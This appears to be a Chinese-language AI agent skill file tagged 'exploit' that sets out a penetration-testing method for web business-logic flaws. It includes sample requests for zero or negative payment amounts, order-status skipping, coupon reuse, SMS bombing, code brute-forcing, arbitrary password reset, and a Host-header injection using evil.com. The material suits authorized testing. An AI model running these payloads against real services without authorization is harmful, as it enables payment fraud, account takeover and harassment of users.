---
name: business-logic-attack
description: "Web 应用业务逻辑漏洞检测与利用。当目标有支付/交易/订单/优惠券/积分/余额/充值/转账/购物车等商业功能时使用。当发现用户注册/登录/短信验证码/邮箱验证/密码重置等账户功能时使用。当 API 请求中出现价格(price/amount)、数量(quantity/count)、订单号(order_id)、优惠码(coupon/promo)等业务参数时使用。业务逻辑漏洞不需要技术漏洞（SQLi/XSS），而是利用应用流程设计缺陷——负数金额、0元支付、订单状态篡改、验证码复用、并发竞争。SRC 众测和实战渗透中最高频的漏洞类型之一，每个有交易功能的应用都应检查"
metadata:
  tags: "business logic,支付,payment,订单,order,优惠券,coupon,积分,balance,越权,短信轰炸,验证码,逻辑漏洞,0元购,负数,篡改"
  category: "exploit"
---

# 业务逻辑漏洞方法论

业务逻辑漏洞的本质是：应用在服务端没有正确校验业务规则，导致攻击者可以通过修改请求参数来违反预期的业务流程。这类漏洞 WAF 和自动化扫描器几乎无法检测——因为每个请求看起来都是"正常"的 HTTP 请求。

## Phase 0: 攻击面识别

先通读应用功能，找到所有涉及"状态变化"或"价值转移"的操作：

| 功能类型 | 关注点 | 典型漏洞 |
|----------|--------|----------|
| 支付/购买 | price/amount/total 参数 | 金额篡改、0元购、负数退款 |
| 优惠券/促销 | coupon/promo/discount | 复用、枚举、叠加 |
| 积分/余额 | points/balance/credits | 负数充值、并发消费 |
| 订单流程 | order_id/status/step | 状态跳转、重复操作 |
| 短信/邮箱验证 | phone/email/code | 轰炸、爆破、绕过 |
| 密码重置 | token/code/user_id | 任意用户重置 |
| 用户注册 | role/type/is_admin | 角色注入（→ privilege-escalation-web） |
| 文件/资源操作 | file_id/doc_id | 越权访问（→ idor-methodology） |

## Phase 1: 支付与交易

### 1.1 金额篡改

拦截支付请求，修改 price/amount/total 参数：

```
原始: POST /api/pay {"order_id":"123","amount":9999}
测试: POST /api/pay {"order_id":"123","amount":1}
测试: POST /api/pay {"order_id":"123","amount":0}
测试: POST /api/pay {"order_id":"123","amount":-1}
测试: POST /api/pay {"order_id":"123","amount":0.01}
```

重点检查：
- 服务端是否用客户端传来的金额，还是从数据库查询商品价格
- 负数金额是否会导致退款到账户余额
- 小数精度问题（0.001 元能否通过校验）

### 1.2 数量篡改

```
原始: {"product_id":"A","quantity":1,"price":100}
测试: {"product_id":"A","quantity":0,"price":100}    → 0元购？
测试: {"product_id":"A","quantity":-1,"price":100}   → 退款？
测试: {"product_id":"A","quantity":99999,"price":100} → 溢出？
```

### 1.3 订单状态篡改

```
正常流程: 待支付(0) → 已支付(1) → 已发货(2) → 已完成(3)
攻击: 直接发 status=1 跳过支付
攻击: 已完成后再发 status=0 重新获取商品
攻击: 修改其他用户的订单状态
```

### 1.4 支付回调伪造

第三方支付（支付宝/微信/Stripe）回调通常是 POST 到应用的 notify_url：
- 检查回调是否验证签名
- 是否可以修改 `total_amount` 字段
- 是否可以重放回调请求（重复到账）
- 是否可以用测试环境的支付结果通知正式环境

## Phase 2: 优惠券与积分

### 2.1 优惠券滥用

```
# 同一优惠码多次使用
POST /api/coupon/apply {"code":"SAVE50"} → 重复发送

# 优惠码枚举（如果格式可预测）
PROMO001, PROMO002, PROMO003...

# 多优惠券叠加
POST /api/coupon/apply {"codes":["SAVE50","WELCOME20"]}

# 负折扣
POST /api/coupon/apply {"discount":-100}
```

### 2.2 积分/余额操作

```
# 转账负数
POST /api/transfer {"to":"victim","amount":-100}

# 并发充值竞争 → 与 race-condition-exploit 配合
# 积分兑换精度问题（取整方向是否可利用）
```

## Phase 3: 验证码与认证

### 3.1 短信验证码

```
# 短信轰炸：同一号码无频率限制
# 验证码爆破：4-6 位数字穷举
# 验证码复用：验证成功后 code 未失效
# 验证码泄露：响应中返回了 code
# 手机号参数污染：
POST /api/sms/send {"phone":["13800138000","attacker_phone"]}
```

### 3.2 密码重置漏洞

```
# 任意用户密码重置 — 修改 user_id/email
POST /api/reset {"token":"valid_token","user_id":"victim_id","password":"hacked"}

# Host 头注入 — 重置链接指向攻击者域名
POST /api/forgot  Host: evil.com  {"email":"victim@target.com"}
```

### 3.3 登录逻辑

```
# 账户锁定绕过 — 大小写/空格/unicode 变体
# 响应差异枚举 — "用户名不存在" vs "密码错误"
```

## Phase 4: 流程跳过

### 4.1 多步骤操作跳过

```
正常: Step1(填信息) → Step2(验证) → Step3(提交)
攻击: 直接请求 Step3 的 API，跳过验证步骤
```

### 4.2 前端校验绕过

所有前端校验都可通过抓包绕过——价格只读字段、按钮 disabled、下拉限制选项。

## 通用测试清单

```
✅ 所有价格/金额参数: 改为 0、负数、极大值、小数
✅ 所有数量参数: 改为 0、负数、极大值
✅ 所有状态参数: 尝试跳转、回退、重复
✅ 所有 ID 参数: 替换为其他用户/订单的 ID (→ IDOR skill)
✅ 所有验证码: 复用、爆破、轰炸
✅ 所有优惠券: 复用、枚举、叠加
✅ 所有多步骤操作: 跳过中间步骤
✅ 并发请求: 余额消费、优惠券使用 (→ race-condition skill)
```

## 深入参考

- 业务逻辑缺陷模式速查（支付/2FA/CAPTCHA/速率限制/注册/密码重置） → [references/logic-flaw-patterns.md](references/logic-flaw-patterns.md)
